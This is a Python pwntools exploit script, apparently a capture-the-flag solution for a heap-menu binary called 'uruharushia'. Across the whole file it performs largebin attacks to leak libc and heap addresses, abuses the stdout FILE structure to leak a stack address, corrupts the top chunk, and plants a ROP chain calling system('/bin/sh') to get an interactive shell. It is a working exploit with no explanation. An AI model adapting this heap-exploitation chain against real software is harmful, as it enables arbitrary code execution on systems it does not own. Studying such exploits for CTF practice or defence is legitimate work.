

from pwn import *
import codecs

p = process('./uruharushia', aslr=True)
# p = process('./uruharushia', aslr=False)
# libc = ELF("./libc.so.6")

def add(ind, size, content):
    p.sendlineafter("> ", "1".encode('latin-1'))
    p.sendlineafter("Index:", str(ind).encode('latin-1'))
    p.sendlineafter("Length:", str(size).encode('latin-1'))
    p.sendafter("Content:", content)

def delete(ind):
    p.sendlineafter("> ", "2".encode('latin-1'))
    p.sendlineafter("Index:", str(ind).encode('latin-1'))

def edit(ind, content):
    p.sendlineafter("> ", "3".encode('latin-1'))
    p.sendlineafter("Index:", str(ind).encode('latin-1'))
    p.sendafter("data:", content)

def offset2size(ofs):
	return ((ofs) * 2 - 0x20)

p.sendlineafter(":", 'asdf'.encode('latin-1'))

add(1, 0x510, b'asdf')
add(2, 0x510, b'asdf')
add(3, 0x510, b'asdf')
add(4, 0x510, b'asdf')
add(15, 0xa00, b'BARRIER')
add(5, 0x500, b'asdf')
add(15, 0xa00, b'BARRIER')
add(7, 0x590, b'asdf')
add(8, 0x590, b'asdf')
add(9, 0x590, b'asdf')
add(10, 0x590, b'asdf')
add(15, 0xa00, b'BARRIER')
add(11, 0x580, b'asdf')
add(15, 0xa00, b'BARRIER')

delete(1)
delete(2)
delete(3)
delete(4)
add(0, 0xa80, b'\x00'*0x518 + p64(0x531) + b'\x00'*0x528 + p64(0x21) + p64(0)*3 + p64(0x21))
add(15, 0xa00, b'remove_rest')
delete(2)
add(15, 0x520, b'move_to_largebin')
delete(0)
add(15, 0x520, b'move_pointer_to_bk_nextsize')
add(15, 0x570, b'move_remaining_to_largebin')


delete(7)
delete(8)
delete(9)
delete(10)
add(6, 0xb70, b'\x00'*0x598 + p64(0x5b1) + b'\x00'*0x5a8 + p64(0x21) + p64(0)*3 + p64(0x21))
add(15, 0xb10, b'remove_rest')
delete(8)
add(15, 0x5a0, b'move_to_largebin')
delete(6)
add(15, 0x5a0, b'move_pointer_to_bk_nextsize')
add(15, 0x5f0, b'move_remaining_to_largebin')

delete(5)
edit(0, b'\x00'*0x518 + p64(0x531) + p64(0)*3 + b'\x98\xd7')
add(15, 0xf00, b'get_libc_leak_part_1')

delete(11)
edit(6, b'\x00'*0x598 + p64(0x5b1) + p64(0)*3 + b'\x88\xd7')
p.sendlineafter("> ", b"1")
p.sendlineafter("Index:", b'15')
p.sendlineafter("Length:", b'3840')

# libc_leak = int(codecs.encode(p.recvuntil("\x15", timeout=1)[-6:][::-1], 'hex'), 16)
# heap_leak = int(codecs.encode(p.recv(8)[-6:][::-1], 'hex'), 16)

libc_leak = int(codecs.encode(p.recvuntil("\x7f", timeout=1)[-6:][::-1], 'hex'), 16)
heap_leak = int(codecs.encode(p.recv(8)[-6:][::-1], 'hex'), 16)
p.sendlineafter("Content:", b'asdf')

print(hex(libc_leak))
print(hex(heap_leak))

libc_base = libc_leak - 0x1f2110
system = libc_base + 0x28d60
pop_rdi_ret = libc_base + 0x28edc
ret = pop_rdi_ret+1
bin_sh = libc_base + 0x1b0698
system_mem = libc_base + 0x1f2508
environ = libc_base + 0x1f9200
stdout = libc_base + 0x1f2780
top_chunk = heap_leak + 0xb9d0
top_chunk_2 = libc_base + 0x1f2f40


add(0, 0x610, 'ZAFIR')
add(15, 0x600, 'BARRIER')
add(1, 0x600, 'tumbal')
add(15, 0x600, 'BARRIER')
delete(0)
add(15, 0x620, 'move_to_largebin')
delete(1)
edit(0, p64(0) + p64(system_mem-0x20))
# pause()
add(15, 0x620, 'change_system_mem')
add(0, 0x700, 'to_change_top_chunk_size')
delete(0)
add(1, 0x630, 'AAAAAAAAAAAA')
edit(0, b'\x00'*0x638 + p64(heap_leak))
add(0, (stdout-top_chunk - 0x80), b'asdf')
add(0, 0x800, p64(0)*8 + p64(0x00000000fbad2887) + p64(environ)*4 + p64(environ+8) + p64(environ)*2)

stack_leak = int(codecs.encode(p.recvuntil("\x7f", timeout=1)[-6:][::-1], 'hex'), 16)
print(hex(stack_leak))

rop_loc = stack_leak - 0x140 - 0x100
add(0, (rop_loc-top_chunk_2), b'asdf')
add(0, 0x800, p64(ret)*100 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system))




p.interactive()